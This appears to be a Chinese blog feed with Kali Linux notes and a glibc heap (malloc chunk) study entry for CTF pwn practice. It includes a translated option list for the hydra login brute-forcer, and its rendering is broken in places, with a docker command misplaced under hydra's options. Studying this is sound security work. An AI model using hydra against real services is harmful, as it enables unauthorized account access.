class="line"></span><br><span class="line">netstat -r 命令可以实现与“route<span class="string">"命令相同的功能，即显示Linux系统中的路由信息（路由表）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">”netstat -au"</span>显示udp传输协议的连接情况</span><br><span class="line"></span><br><span class="line"><span class="string">"netstat -at"</span>显示tcp传输协议的连接状况</span><br></pre></td></tr></table></figure><h4 id="interfaces文件修改"><a href="#interfaces文件修改" class="headerlink" title="interfaces文件修改"></a>interfaces文件修改</h4><p>/etc/network/“目录下的”interfaces”文件是kali linux中最重要的网络配置文件之一，该文件用于描述主机中所有的网络接口的信息，不论Linux主机中作为DHCP客户端还是配置使用静态IP地址，都需要对该文件进行修改。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iface eth0 inet dhcp       <span class="comment">//用于设置网络接口eth0 通过dhcp协议获取网络配置</span></span><br></pre></td></tr></table></figure><p>在eht0文件中加入以下语句</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto</span> <span class="string">lo </span></span><br><span class="line"><span class="attr">iface</span> <span class="string">eth0 inet dhcp</span></span><br></pre></td></tr></table></figure><p>保存更改后重启networking服务</p><p> /etc/init.d/networking restart</p><h2 id="解决kali空间不足"><a href="#解决kali空间不足" class="headerlink" title="解决kali空间不足"></a>解决kali空间不足</h2><h3 id="升级系统时"><a href="#升级系统时" class="headerlink" title="升级系统时"></a>升级系统时</h3><p>[参考](ln -s /home/spool /var)</p><h3 id="var-cache-apt-archives-空间不够"><a href="#var-cache-apt-archives-空间不够" class="headerlink" title="var/cache/apt.archives 空间不够"></a>var/cache/apt.archives 空间不够</h3><p>存储apt install appname时下载的安装文件，可以清理</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ul><li><pre><code>  - 清除自动安装但不再使用的过期安装包  sudo apt-get autoremove  - 清除所有已下载的安装包  ​      sudo apt-get clean  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>  - 在某个空间大的分区建立一个目录，然后把/var/cache/apt/archives换成指向那个目录的软链接  mkdir -p &quot;$HOME/debs/partial&quot;  sudo rm -rf /var/cache/apt/archives\  sudo ln -s &quot;$HOME/debs&quot; /var/cache/apt/archives  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### apt update提示没有release文件</span><br><span class="line"></span><br><span class="line">删掉  /etc/apt/sources.list.d 下 docker.list 文件</span><br><span class="line"></span><br><span class="line">## hydra  网络登陆破解</span><br><span class="line"></span><br><span class="line">**用法：**</span><br></pre></td></tr></table></figure>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</code></pre></li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">选项：sudo<span class="built_in"> add-apt-repository </span>\</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/debian \</span></span><br><span class="line"><span class="string">   $(lsb_release -cs) \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>-R             恢复先前中止/坠毁的会话</p><p>-I              忽略现有的恢复文件（不要等待10秒钟）</p><p>-S              执行SSL连接</p><p>-s PORT    如果服务在不同的默认端口上，请在此处定义它</p><p>-l LOGIN  或 -L FILE          以LOGIN名称登录，或从FILE加载多个登录名</p><p>-p PASS   或 -P FILE          尝试密码PASS，或从FILE加载多个密码</p><p>-x MIN：MAX：CHARSET               密码暴力生成，键入“-x -h”以获得帮助</p><p>-y                           禁止在暴力中使用符号，参见上文</p><p>-e nsr                     尝试“n”空密码，“s”登录为pass和/或“r”反向登录</p><p>-u                            循环用户，而不是密码（有效！用-x表示）</p><p>-C FILE                    冒号分隔“login：pass”格式，而不是-L / -P选项</p><p>-M FILE                   要攻击的服务器列表，每行一个条目，’：’指定端口</p><p>-o FILE                     将找到的登录名/密码对写入FILE而不是stdout</p><p>-b FORMAT              指定-o FILE：文本（默认），json，jsonv1的格式</p><p>-f / -F                       在找到登录/传递对时退出（-M：-f每个主机，-F全局）</p><p>-t TASKS                    为每个目标并行运行TASKS个连接数（默认值：16）</p><p>-T TASKS                  运行TASKS连接并行整体（for -M，默认值：64）</p><p>-w / -W TIME            每个线程（0）之间的响应（32）/连接之间的TIME等待时间</p><p>-c TIME                     每次尝试登录所有线程的等待时间（强制执行-t 1）</p><p>-4 / -6                       使用IPv4（默认）/ IPv6地址（总是在[]中也放在-M中）</p><p>-v / -V / -d                 详细模式/显示登录+每个尝试/调试模式的传递</p><p>-O                              使用旧的SSL v2和v3</p><p>-q                               不打印有关连接错误的消息</p><p>-U                               服务模块使用细节</p><p>-h                               更多命令行选项（COMPLETE HELP）</p><p>server                         目标：DNS，IP或192.168.0.0/24（此或-M选项）</p><p>service                        该服务以破解（请参阅下面的支持的协议）</p><p>OPT                            某些服务模块支持额外的输入（-U用于模块帮助）</p><p>支持的服务：</p><p>asterisk、 afp、 cisco、 cisco-enable、 cvs、 firebird、 ftp、 ftps、 http(s)-{head|get}、 http(s)-{get|post}-form、 http-proxy、 http-proxy-urlenum、 icq、 imap(s)、 irc ldap2(s)、 ldap3<a href="s">-{cram|digest}md5</a>、 mssql、 mysql、 ncp、 nntp、 oracle-listener、 oracle-sid、 pcanywhere、 pcnfs、 pop3(s)、 postgres、 rdp、 rexec、 rlogin、 rsh s7-300、 sip、 smb、 smtp(s)、 smtp-enum、 snmp、 socks5、 ssh、 sshkey、 svn、 teamspeak、 telnet(s)、 vmauthd、 vnc、 xmpp</p><pre><code></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/Heap</title>
      <link href="pwn/Heap/"/>
      <url>pwn/Heap/</url>
      
        <content type="html"><![CDATA[<h1 id="堆-malloc"><a href="#堆-malloc" class="headerlink" title="堆(malloc)"></a>堆(malloc)</h1><p>整篇文摘参考 ：</p><a id="more"></a><!--文章未完成前持续更新--><p><a href="[https://blog.csdn.net/qq_41453285/category_9150569.html?biz_id=102&utm_term=%E5%A0%86%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-category_9150569.html&spm=1018.2118.3001.4187](https://blog.csdn.net/qq_41453285/category_9150569.html?biz_id=102&utm_term=堆漏洞挖掘&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-category_9150569.html&spm=1018.2118.3001.4187)">专栏</a>（csdn）</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/" target="_blank" rel="noopener">ctf_wiki</a></p><p><a href="https://www.anquanke.com/post/id/196956#h3-7" target="_blank" rel="noopener">安全客how2heap调试</a></p><p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>（github）</p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis" target="_blank" rel="noopener">IO FILE</a> (写在个人博客内)</p><p><strong>the knowledge is power</strong></p><h2 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h2><p><a href="https://blog.csdn.net/Retrovich/article/details/84622645" target="_blank" rel="noopener">chunk块参考</a></p><p>glibc要求chunk块至少可以存储4个必要的字段（prev_size,size,fd,bk)，所以会输入size为0时，glibc根据规定会分配0x20个字</p><p>具体的可以到ctf wiki的 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/" target="_blank" rel="noopener">Glibc Heap Related</a> 看</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**mchunk_size: **该字段表示当前 chunk 的大小，在<span class="number">32</span>位系统中，其大小最小不可低于<span class="number">16</span>个字节，对齐则为<span class="number">8</span>个字节。而在<span class="number">64</span>位系统中，其大小不可低于<span class="number">32</span>个字节，对其则为<span class="number">16</span>个字节。</span><br></pre></td></tr></table></figure><p>malloc_chunk结构体的大小的对齐原则，<strong>在64位系统中位16字节对齐，在32位的系统中位8字节对齐</strong> 。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个字节是没有被使用的，32位系统中，最后3个字节是没有被使用的。</p><p>以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态</p><p><img src="/images/Heap/20190722173401708.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span>    <span class="comment">//</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span>   </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>  <span class="comment">// </span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag' method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of chunk, in bytes                     |A|M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             (size of chunk, but used for application data)    |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of next chunk, in bytes                |A|0|1|</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    Where "chunk" is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but "mem" is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  "Nextchunk" is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:' |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:' |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of next chunk, in bytes                |A|0|0|</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment">    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,</span></span><br><span class="line"><span class="comment">    main arena, described by the main_arena variable.  When additional</span></span><br><span class="line"><span class="comment">    threads are spawned, each thread receives its own arena (up to a</span></span><br><span class="line"><span class="comment">    configurable limit, after which arenas are reused for multiple</span></span><br><span class="line"><span class="comment">    threads), and the chunks in these arenas have the A bit set.  To</span></span><br><span class="line"><span class="comment">    find the arena for a chunk on such a non-main arena, heap_for_ptr</span></span><br><span class="line"><span class="comment">    performs a bit mask operation and indirection through the ar_ptr</span></span><br><span class="line"><span class="comment">    member of the per-heap header heap_info (see arena.c).</span></span><br><span class="line"><span class="comment">    Note that the `foot' of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment">    The three exceptions to all this are:</span></span><br><span class="line"><span class="comment">     1. The special chunk `top' doesn't bother using the</span></span><br><span class="line"><span class="comment">        trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">        that would have to index off it. After initialization, `top'</span></span><br><span class="line"><span class="comment">        is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">        MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">        bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">        allocated one-by-one, each must contain its own trailing size</span></span><br><span class="line"><span class="comment">        field.  If the M bit is set, the other bits are ignored</span></span><br><span class="line"><span class="comment">        (because mmapped chunks are neither in an arena, nor adjacent</span></span><br><span class="line"><span class="comment">        to a freed chunk).  The M bit is also used for chunks which</span></span><br><span class="line"><span class="comment">        originally came from a dumped heap via malloc_set_state in</span></span><br><span class="line"><span class="comment">        hooks.c.</span></span><br><span class="line"><span class="comment">     3. Chunks in fastbins are treated as allocated chunks from the</span></span><br><span class="line"><span class="comment">        point of view of the chunk allocator.  They are consolidated</span></span><br><span class="line"><span class="comment">        with their neighbors only in bulk, in malloc_consolidate.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位"><a href="#chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位" class="headerlink" title="chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位"></a>chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位</h3><ul><li><p><strong>NON_MAIN_ARENA：</strong>记录当前 chunk 是否不属于主线程</p></li><li><p><strong>IS_MAPPED：</strong>记录当前chunk是否是由mmap分配的</p></li><li><p><strong>PREV_INUSE：</strong>如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</p><h3 id="发生在-int-free函数中的合并操作"><a href="#发生在-int-free函数中的合并操作" class="headerlink" title="发生在_int_free函数中的合并操作"></a>发生在_int_free函数中的合并操作</h3>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong><em>\</em>函数解析：**</strong></p><ul><li><p>首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0</p></li><li><p>如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中</p></li><li><p>1.通过recv_size函数得到前面要合并的chunk的大小</p></li><li><p>2.将自己的大小与前面的presize相加得到合并后的chunk的大小</p></li><li><p>3.将p的指针向前移动，移动到前面那个chunk的开头处</p></li><li><p>4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并</p><p>  <img src="/images/Heap/20190724193910998.png" alt="img"></p></li></ul></li></ul><h3 id="chunk的mchunk-prev-size成员的空间复用"><a href="#chunk的mchunk-prev-size成员的空间复用" class="headerlink" title="chunk的mchunk_prev_size成员的空间复用"></a>chunk的mchunk_prev_size成员的空间复用</h3><p><strong>成员介绍</strong></p><ul><li>①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小</li><li>②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的</li></ul><p><strong>mchunk_prev_size成员的合并操作</strong></p><ul><li>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储</li><li>否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员</li></ul><h3 id="chunk块大小计算"><a href="#chunk块大小计算" class="headerlink" title="chunk块大小计算"></a>chunk块大小计算</h3><p>malloc的参数不等于实际分配堆块的大小，事实上ptmalloc分配出来的大小是对齐的。这个长度一般使字长的2倍，比如32位系统使8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行malloc(0)会返回用户区域为16字节的块</p><p><strong>demo</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,p); <span class="comment">//打印malloc可以存储的起始地址，即p可以访问的开始地址</span></span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>在pwndng中通过heap 命令可以查看到申请堆块的地址（printf申请到的缓冲区空间大小在1024byte），在上面程序的运行当中printf()函数申请缓冲空间时在p 后面（关于这个后面我会放个程序的结构图验证一下），所以printf应该在高地址开辟空间。所以此时可以使用printf在堆块的地址减去malloc申请空间的地址，如下图所示， 0x602020-0x602000 = 0x20, 代表了我们在glibc中实际申请了0x10+0x10=20的堆chunk。通过printf 打印出来的p可以访问的起始地址，我们可以得知malloc_chunk结构体的前两个成员（size之前)加起来的大小</p><p><img src="/images/Heap/20190722171233411.png" alt="img"></p><p>图中两个malloc_chunk的size大小 = 33 = ox20+1（PREV_INUSE位为1）</p><p><strong>先后分配堆块时堆块地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">        <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1: %p\n"</span>,p1)</span><br><span class="line">        <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"p2:%p\n"</span>,p2);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/image-20200903085131895.png" alt="image-20200903085131895"></p><p>可以看到p1,p2 打印出来的可访问起始地址</p><p><img src="/images/Heap/image-20200903085423917.png" alt="image-20200903085423917"></p><p>因为 调用了两次printf ，printf需要申请缓冲区空间，所以两个chunk块的空间不连续，但单单从p1，p2的起始地址来看，先申请的堆块位于低地址</p><p><strong>chunk的实际大小</strong></p><ul><li><p>当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员</p></li><li><p>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员</p></li><li><p>例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间</p></li><li><p>前面文章介绍过chunk的mchunk_prev_size成员的合并操作，所以chunk的实际大小还要配合这个规则：<a href="https://blog.csdn.net/qq_41453285/article/details/97158973" target="_blank" 